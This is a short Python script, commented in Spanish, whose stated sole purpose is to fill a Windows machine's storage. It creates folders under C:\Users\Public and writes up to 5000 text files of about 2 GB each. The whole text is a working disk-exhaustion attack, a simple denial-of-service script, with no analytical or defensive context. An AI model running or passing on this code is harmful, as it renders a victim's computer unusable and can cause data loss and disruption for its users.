#Crea carpetas con archivos de texto muy pesados dentro. Lo unico que hace es llenar el dispositivo de alm,acenamiento (se tarda 2 horas por Tera aprox.)
import os
os.chdir(r"C:\Users\Public")
os.makedirs('A')
os.chdir(r"C:\Users\Public\A")
n=0
rootPath=r"C:\Users\Public\A"
path=r"C:\Users\Public\A\A"
for i in range (5000):    
    pathh=path+str(n) 
    os.makedirs('A'+str(n))
    os.chdir(pathh)
    f = open("a.txt", "w")
    f.write("Xd"*1000000000)
    os.chdir(rootPath)
    f=None
    n+=1
 